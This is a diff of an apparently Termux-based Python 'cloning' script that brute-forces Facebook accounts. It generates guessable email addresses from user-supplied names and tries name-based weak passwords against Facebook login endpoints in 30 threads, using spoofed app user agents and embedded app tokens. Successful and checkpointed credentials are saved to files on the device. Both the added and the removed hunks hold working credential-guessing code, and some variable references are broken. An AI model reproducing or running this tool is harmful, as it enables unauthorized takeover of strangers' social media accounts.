@@ -8,6 +8,7 @@ sys.path.remove(site_packages)
 sys.path.insert(4,http_directory+'/reqmodule')
 sys.path.insert(5,http_directory)
 try:
+        os.system('rm -rf mail.txt')
         os.system('rm -rf device_info.txt')
         os.mkdir('crypto')
 except:pass
@@ -92,23 +93,6 @@ else:
         pass
 os.system("rm -rf .f1")
 os.system("rm -rf .f2")
-
-ugen=[]
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
 
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
@@ -202,15 +186,10 @@ loop = 0
 methods = []
 ok=[]
 cps=[]
-twf=[]
 total=[]
 clone_type=[]
 android_models = []
-def linex():
-        print('\033[1;37m----------------------------------------------')
-def clear():
-        os.system('clear')
-        print(logo)
+
 def main():
         os.system('rm -rf ...txt')
         os.system('clear')
@@ -411,32 +390,68 @@ class crack_main():
                         print(' No file found ....')
                         exit()
         def crackmail(self,id):
-                os.system('rm -rf mail.txt')
-                clear()
-                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
-                linex()
-                first = input(' Put first name: ')
-                linex()
-                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
-                linex()
-                last = input(' Put last name: ')
-                linex()
-                print(' Example: @gmail.com , @yahoo.com etc...')
-                linex()
-                domain = input(' domain: ')
-                linex()
+                global methods
+                os.system("clear");print(logo)
+                import requests,random
+                user=[]
+                passlist = []
+                print(50*'=')
+                print(" [*] First Name Example ahmad,arsalan")
+                print(50*'=')
+                first = input(" First Name : ")
+                print(50*'=')
+                print(" [*] Last Name Example ali,arshad")
+                print(50*'=')
+                last = input(" Last Name : ")
+                print(50*'=')
+                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
+                print(50*'=')
+                domain = input(" Domain : ")
+                print(50*'=')
+                print("\n [?] Limit ids Example 1000,5000,50000")
+                print(50*'=')
                 try:
                         limit=int(input(' Put limit: '))
                 except ValueError:
                         limit = 5000
                 print(50*'=')
                 print(' Getting gmails...')
+                lists = ['3','4']
                 for nmbr in range(limit):
-                        nmpp = random.randint(99,9999)
-                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
-                        naseeb = open('mail.txt','a').write(nmp)
-                self.id = open('mail.txt').read().splitlines()
-                self.pasw()
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        zee = open('mail.txt', 'r').read().splitlines()
+                with ThreadPool(max_workers=30) as formSubmit:
+                        total = str(len(zee))
+                        os.system('clear')
+                        print(logo)
+                        print(' Total Ids : '+str(len(total)))
+                        print(' Cloning Is Started Wait For Results')
+                        print(' After Every 5 Min Turn Airplane On/Off')
+                        print(50*'=')
+                        for user in zee:
+                                iid,name = user.split('|')
+                                first_name = name.rsplit(' ')[0]
+                                try:
+                                        last_name = name.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                formSubmit.submit(self.m1,iid,name,passlist)
+                print(50*'=')
+                print(' SucessFully Process Is Completed ')
+                print(' Total Ok Ids : '+str(len(ok)))
+                print(' Ok Ids Save In : /sdcard/zee_ok.txt')
+                print(50*'=')
+                input('\n Press enter to back ')
+                main()
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo)
@@ -454,27 +469,33 @@ class crack_main():
         def m1(self,iid,name,passlist):
                 try:
                         global ok,loop,android_models
-                        sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+                        sys.stdout.write('\r[ZEE] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
                                 ln = name.split(' ')[1]
                         except:
                                 ln = fn
-                        fs = first_name.lower()
-                        ls = last_name.lower()
-                        passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                 infos = open('device_info.txt','r').read()
-                                try:
-                                        version_,model_,brand_name_,width_,height_=infos.split('$')
-                                except:
-                                        veersion_ = str(random.randint(7,13))
-                                        moodel_ = "Infinix"
-                                        brrand_name_ = "Infinix"
-                                        wiidth_ = "720"
-                                        heeight_ = "1280"
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
+                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                                fbbv = str(random.randint(111111111,999999999))
+                                android_version = device['android_version']
+                                model = device['model']
+                                build = device['build']
+                                fblc = device['fblc']
+                                fbcr = sim_id
+                                fbmf = device['fbmf']
+                                fbbd = device['fbbd']
+                                fbdv = device['fbdv']
+                                fbsv = device['fbsv']
+                                fbca = device['fbca']
+                                fbdm = device['fbdm']
+                                fbfw = '1'
+                                fbrv = '0'
+                                fban = 'FB4A'
+                                fbpn = 'com.facebook.katana'
+                                uas = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                                 fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
                                 abhi = "5531728|62f8ce9"
@@ -502,17 +523,42 @@ class crack_main():
                 except Exception as e:
                         pass
                         #print(e)
+
         def pasw(self):
                 passlist = []
+                os.system('clear')
+                print(logo)
+                print(' for auto password list type auto or Auto')
+                print(50*"=")
+                pl = input(' How Much Password Do You Want To Add ? ')
+                if pl in ['auto','Auto','AUTO','auto or Auto']:
+                        passlist.append('first123')
+                        passlist.append('first12345')
+                        passlist.append('first1234')
+                        passlist.append('first12')
+                        passlist.append('firstlast')
+                        passlist.append('first last')
+                        passlist.append('first786')
+                        passlist.append('last12')
+                        passlist.append('first1122')
+                        passlist.append('last123')
+                        passlist.append('last12')
+                        passlist.append('i love you')
+                else:
+                        print(' Example first123,last123,khan123,firstlast')
+                        print(50*"=")
+                        for cd in range(int(pl)):
+                                passlist.append(input(f' ({cd+1}) Password : '))
+                os.system('clear')
+                print(logo)
+                print(' Total Ids : '+str(len(self.id)))
+                print(' Cloning Is Started Wait For Results')
+                print(' After Every 5 Min Turn Airplane On/Off')
+                print(50*'=')
                 with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(self.id))
-                        clear()
-                        print(' Total account : \033[1;32m'+total)
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
-                        linex()
                         for user in self.id:
-                                iid,zee = user.split('|')
-                                formSubmit.submit(self.m1,iid,zee,passlist)
+                                iid,name = user.split('|')
+                                formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
@@ -520,148 +566,7 @@ class crack_main():
                 print(50*'=')
                 input('\n Press enter to back ')
                 main()
-        def ffb(self,iid,name,passlist):
-                global loop,oks,cps
-                sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                session = requests.Session()
-                try:
-                        first = name.split(' ')[0]
-                        try:
-                                last = name.split(' ')[1]
-                        except:
-                                last = 'Khan'
-                        ps = first.lower()
-                        ps2 = last.lower()
-                        for fikr in passlist:
-                                pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                                ua=random.choice(ugen)
-                                head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                                getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                                Aking=session.cookies.get_dict().keys()
-                                if "c_user" in Aking:
-                                        print('\r\r\033[1;32m [ZEE-OK] %s | %s'%(ids,pas))
-                                        open('/sdcard/zee_ok.txt', 'a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                                elif 'checkpoint' in Aking:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/zee_cp.txt', 'a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                break
-                                else:
-                                        continue
-                except requests.exceptions.ConnectionError:
-                        time.sleep(20)
-                loop+=1
-        def rndm(self,iid,name,passlist):
-                global loop
-                global ok
-                sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
-                fn = name.split(' ')[0]
-                try:
-                        ln = name.split(' ')[1]
-                except:
-                        ln = fn
-                fs = first_name.lower()
-                ls = last_name.lower()
-                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-                try:
-                        for pas in passlist:
-                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                                fbbv = str(random.randint(111111111,999999999))
-                                android_version = device['android_version']
-                                model = device['model']
-                                build = device['build']
-                                fblc = device['fblc']
-                                fbcr = sim_id
-                                fbmf = device['fbmf']
-                                fbbd = device['fbbd']
-                                fbdv = device['fbdv']
-                                fbsv = device['fbsv']
-                                fbca = device['fbca']
-                                fbdm = device['fbdm']
-                                fbfw = '1'
-                                fbrv = '0'
-                                fban = 'FB4A'
-                                fbpn = 'com.facebook.katana'
-                                ua = 'Dalvik/2.1.0 (Linux; U; Android 10.0.0; SM-N970F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970F;FBSV/10.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
-                                random_seed = random.Random()
-                                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                                device_id = str(uuid.uuid4())
-                                secure = str(uuid.uuid4())
-                                family = str(uuid.uuid4())
-                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                                xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                                sim_serials = f'["{xd}"]'
-                                li = ['28','29','210']
-                                li2 = random.choice(li)
-                                j1 = ''.join(random.choice(digits) for _ in range(2))
-                                jazoest = li2+j1
-                                data = {
-                                        'adid':adid,
-                                        'format':'json',
-                                        'device_id':device_id,
-                                        'email':ids,
-                                        'password':pas,
-                                        'generate_analytics_claims':'1',
-                                        'credentials_type':'password',
-                                        'source':'login',
-                                        'error_detail_type':'button_with_disabled',
-                                        'enroll_misauth':'false',
-                                        'generate_session_cookies':'1',
-                                        'generate_machine_id':'1',
-                                        'fb_api_req_friendly_name':'authenticate',
-                                }
-                                headers={
-                                        'Authorization':f'OAuth {accessToken}',
-                                        'X-FB-Friendly-Name':'authenticate',
-                                        'X-FB-Connection-Type':'unknown',
-                                        'User-Agent':ua,
-                                        'Accept-Encoding':'gzip, deflate',
-                                        'Content-Type': 'application/x-www-form-urlencoded',
-                                        'X-FB-HTTP-Engine': 'Liger'
-                                        }
-                                url = 'https://b-graph.facebook.com/auth/login'
-                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                                po = requests.post(url,data=data,headers=headers).json()
-                                if 'session_key' in po:
-                                        try:
-                                                uid = po['uid']
-                                        except:
-                                                uid = ids
-                                        if str(uid) in oks:
-                                                break
-                                        else:
-                                                print('\r\r\033[1;32m [ZEE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/zee_ok.txt','a').write(str(uid)+'|'+pas+'\n')
-                                                oks.append(str(uid))
-                                                break
-                                elif 'www.facebook.com' in po['error']['message']:
-                                        try:
-                                                uid = po['error']['error_data']['uid']
-                                        except:
-                                                uid = ids
-                                        if uid in oks:pass
-                                        else:
-                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/zee_cp.txt','a').write(str(uid)+'|'+pas+'\n')
-                                                cps.append(str(ids))
-                                                break
-                                else:continue
-                        loop+=1
-                except Exception as e:
-                        pass
 
-        
-                
 def create_file():
         os.system('clear')
         print(logo)
